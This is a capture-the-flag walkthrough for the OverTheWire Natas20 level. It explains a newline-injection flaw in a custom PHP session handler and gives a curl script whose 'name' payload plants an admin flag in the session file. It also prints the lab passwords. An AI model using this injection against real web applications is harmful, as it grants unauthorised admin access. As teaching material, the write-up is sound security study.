---
category: natas
title: Natas20 - Session Management Part 3
---

website: http://natas20.natas.labs.overthewire.org/ (password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF)

In this challenge, the `print_credentials()` reads as below:

```php
function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas21\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
```

As what we can see, in order to get the password for the next level, the session must contain a variable named "admin" and its value must be "1".

According to the source code, to inject <small>$_SESSION[\"admin\"] = 1</small>, one way is to take advantage of the function `myread()` and `mywrite()`:

```php
function myread($sid) {
    ...
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
        $parts = explode(" ", $line, 2);
        if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    ...
}
 
function mywrite($sid, $data) {
    ...
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    ...
}
```

What `myread()` does is to read a file line by line to restore all key/value for a session, and what `mywrite()` does is to write key/value of a session into a file. Here the question is, what if the value contains a "\n" (i.e., a newline character)? Because there is no input validation, the function `mywrite()` will write the "\n" into the file as well. For example, if the (key, value) pair is <small>(\"name\", \"admin\nadmin 1\")</small>, then two lines are written into the file: The 1st line is "name admin" and the 2nd line is "admin 1". Later on when `myread()` is invoked during `session_start()`, it will read two lines and restore two session variables, which are:
* $_SESSION[\'name\'] = \'admin\'
* $_SESSION[\'admin\'] = \'1\'

Notice that the 2nd variable will hit the condition and prints out the password.

Here is how I cracked the password. 

```shell
#!/bin/sh

curl -isu natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF  "http://natas20.natas.labs.overthewire.org/index.php?name=admin%0Aadmin%201&debug" --cookie "PHPSESSID=hello"

sleep 1

curl -isu natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF  "http://natas20.natas.labs.overthewire.org/index.php?name=admin%0Aadmin%201&debug" --cookie "PHPSESSID=hello"
```

I sent two requests to the web application. In both requests, I composed a special value for the parameter "name", which is <small>admin%0Aadmin%201</small>. '%0A' and '%20' are the URL encode for the new line character and the space character.
Also, I used the same session ID in both requests. That's because according to the source code, the name of the file which stores the `$_SESSION` variables is named after a session ID. Running the above script, the first request will lead the application to create a file which contains two lines, which looks like below:

```plain
name admin
admin 1
```

Once the second request is received, it will lead the application to read the file and restore the `$_SESSION` variables. The result shows that the password for natas21 is <small>IFekPyrQXftziDEsUr3x21sYuahypdgJ</small>.


<strong>REFERENCE</strong>

Here is a reference from the PHP manual about what happens when `session_start()` is invoked:

- <i>When session_start() is called or when a session auto starts, PHP will call the open and read session save handlers. These will either be a built-in save handler provided by default or by PHP extensions (such as SQLite or Memcached); or can be custom handler as defined by session_set_save_handler(). The read callback will retrieve any existing session data (stored in a special serialized format) and will be unserialized and used to automatically populate the $_SESSION superglobal when the read callback returns the saved session data back to PHP session handling.</i>

For more details, please refer to <a href="https://www.php.net/manual/en/function.session-start.php">this link</a>.

